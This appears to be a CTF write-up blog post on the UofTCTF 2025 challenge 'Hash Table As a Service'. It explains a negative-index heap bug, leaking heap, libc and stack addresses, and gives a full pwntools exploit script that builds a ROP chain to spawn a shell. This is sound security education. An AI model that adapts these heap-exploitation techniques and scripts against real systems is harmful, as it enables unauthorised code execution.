---
layout: post
title: "UofTCTF 2025 - Pwnable Write up"
date: 2025-01-16 00:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
media_subpath: /assets/img/20250116_uoftctf-2025-wu
image: logo.png
---

I solved 3 pwn challs out of 3 during the CTF (Book Editor, Counting Sort, Hash Table As a Service).

Among them, I want to write down the last one.

- [https://ctftime.org/event/2570/](https://ctftime.org/event/2570/)

## **Hash Table As a Service (15 solves)**

**[0x01] Summary**

- 

**[0x02] Solution**

There were three features in this binary like creating hash table, set hash table, and get hash table.

```c
struct HASH
{
  __int64 size;
  hash_content *content;
};

struct hash_content
{
  __int32 key;
  char value[8];
};
```

Through a global array (`hashTables`), those features are implemented and it has 20 `HASH` entry. And each hash entry has a pointer of `hash_content` structure.

```c
            // creating hash table
            printf("Size: ");
            __isoc99_scanf("%ld", &size);
            if ( (unsigned int)allocHashTable(size, &hashTables[index]) )
```

There was a no limit about the size of hash table, so I can set arbitrary value on BSS.

And I found that the hash table index can have negative value on the set/get hash table features. It means that we can use not only `hashTables` array in BSS, but also the pointers in binary.

```py
pwndbg> x/2gx 0x555555558040 - 0x250
0x555555557df0:    0x000000006ffffef5    0x00005555555543b0
```

Luckily, there was a good target which can be used as a `HASH` structure. It have a large size and its pointer is referencing the address which is less than `hashTables` array. 

Before that, it is important to know how the program retrieve the `hash_content` structure from the `HASH` structure.

```c
hash_content *__fastcall getHashTable(HASH *hash, int key)
{
  unsigned __int64 hash_index; // [rsp+10h] [rbp-10h]
  hash_content *content; // [rsp+18h] [rbp-8h]

  hash_index = (unsigned __int64)key % hash->size;
  content = hash->content;
  while ( key != content[hash_index].key && memcmp(&empty, &content[hash_index], 0xCuLL) )
    ++hash_index;
  return &content[hash_index];
}
```

We can input a index of `HASH` and a key of `hash_content` and the program picks up a `HASH` structure from index with `hashTables`. Then it uses the key as a index of `hash_content` and search it until one of the following conditions is satisfied:

- dereferenced key is same with the entered key.
- dereferenced `hash_content` is filled with zero.

To use the target hash table which I introduced above, I created a hash table which has a same size with the offset from the target and printed the heap address.

```py
pwndbg> x/8gx &hashTables
0x555555558040 <hashTables>:	0x0000000000000000	0x0000000000000000
0x555555558050 <hashTables+16>:	0x0000000000000000	0x0000000000000000
0x555555558060 <hashTables+32>:	0x0000000000000000	0x0000000000000000
0x555555558070 <hashTables+48>:	0x4141414100000510	0x00005555555592a0

pwndbg> x/2gx 0x00005555555543b0 + 0x510 * 0xC
0x555555558070 <hashTables+48>:	0x4141414100000510	0x00005555555592a0
```

Because I can only modify and read 8 bytes from `hash_content->value`, I was only able to acquire and modify the 4 bytes of the heap and it was enough to get advanced.

By using it, we can overwrite any value within the heap segment and make a freed chunk in a unsorted bin without calling `free()` from top chunk. If we could modify the top chunk's size with the page-alignment size lowering previous top chunk's size and allocate a bigger size than its size, we can get freed the top chunk (you can see the details from [house of tangerine](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c))

From the freed top chunk, we can leak the base of glibc segment.

Also, we can set AAR/AAW primitive from the good target.

```py
pwndbg> x/2gx 0x555555558040 - 0x250
0x555555557df0:	0x000000006ffffef5	0x00005555555543b0

pwndbg> x/2gx 0x00005555555543b0 + 0x50F * 0xC
0x555555558064 <hashTables+36>:	0x414141410000050f	0x0000051041414141

pwndbg> x/8gx &hashTables
0x555555558040 <hashTables>:	0x0000000000000015	0x000055555555cf70
0x555555558050 <hashTables+16>:	0x0000000000000155	0x000055555557a010
0x555555558060 <hashTables+32>:	0x0000050f00000000	0x4141414141414141      # <-- hashTables[2]
0x555555558070 <hashTables+48>:	0x4141414100000510	0x000055555555d07c
```

We can set any address to read and write and we already know the libc's base. Then I did ROP on stack. My solver code is following:

```py
from pwn import*
context.binary = ELF("./chall", False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)
# libc = ELF("./libc.so.6", False)
def new_ht(idx, size):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b": ", str(idx).encode())
    p.sendlineafter(b": ", str(size).encode())
def set_ht(idx, key, value):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b": ", str(idx).encode())
    p.sendlineafter(b": ", str(key).encode())
    p.sendafter(b": ", value)
def get_ht(idx, key):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b": ", str(idx).encode())
    p.sendlineafter(b": ", str(key).encode())
def get_ht_brute(idx, key):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.sendline(str(key).encode())

p = process(aslr=0)
# p = remote('34.162.33.160', 5000)
# p = remote('localhost', 5000)

# 1. heap leak through same size with the offset
new_ht(3, 0x510)
set_ht(-0x25, 0x510, b'A'*4)
get_ht(-0x25, 0x510)
p.recvuntil(b'A'*4)
heap = u64(p.recv(4).ljust(8, b'\x00')) - 0x2a0
log.success(f"heap base @ {hex(heap)}")

# 2. make unsorted bin by overwriting TOP chunk 
new_ht(0, 0x100 // 0xC)
set_ht(-0x25, 0x510, b'A'*4 + p32(heap + 0x4070))
set_ht(3, 0, b'A'*4 + p32(0xf91))

# 3. leak libc from heap
new_ht(1, 0x1000 // 0xC)
set_ht(-0x25, 0x510, b'A'*4 + p32(heap + 0x4080 - 0x4))
get_ht(3, 0)
p.recvuntil(b"Value: ")

libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym._IO_2_1_stdin_ - 0x240
log.success(f"libc base @ {hex(libc.address)}")

# 4. stack leak through AAR
set_ht(-0x25, 0x50F, p64(libc.sym.environ - 4))
get_ht(2, 0)
p.recvuntil(b": ")
stack = u64(p.recv(6).ljust(8, b'\x00')) - 0x120
log.success(f"stack @ {hex(stack)}")

# 5. clear stack with zero
set_ht(-0x25, 0x50F, p64(stack - 4))
set_ht(2, 0, p64(0))
for i in range(0x10):
    set_ht(-0x25, 0x50F, p64(stack - 4 + i * 8))
    set_ht(2, 0, p64(0))

# 6. write ROP payload on main RET
rop = ROP(libc)
rop.call(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh"))])
payload = rop.chain()
payload_list = []
for i in range(len(payload) // 8):
    payload_list.append(u64(payload[i*8: (i+1)*8]))

for i in range(len(payload) // 8):
    set_ht(-0x25, 0x50F, p64(stack + 0x18 - 4 - i * 8))
    set_ht(2, 0, p64(payload_list[-1 - i]))

set_ht(-0x25, 0x50F, p64(stack - 4 - (stack >> 32) * 0xC))
set_ht(2, (stack >> 32), p64(payload_list[0]))
p.sendlineafter(b"> ", b'4')

p.interactive()
```

[The intend solver](https://github.com/UofTCTF/uoftctf-2025-chals-public/blob/master/hash-table-as-a-service/solve/solve.py) by the author, cleverly using only the hash features, similarly frees the top chunk to get libc base, repeats the process two more times to create tcache dup, and finally overwrites `_IO_end_buf` of `stdin` to perform FSOP.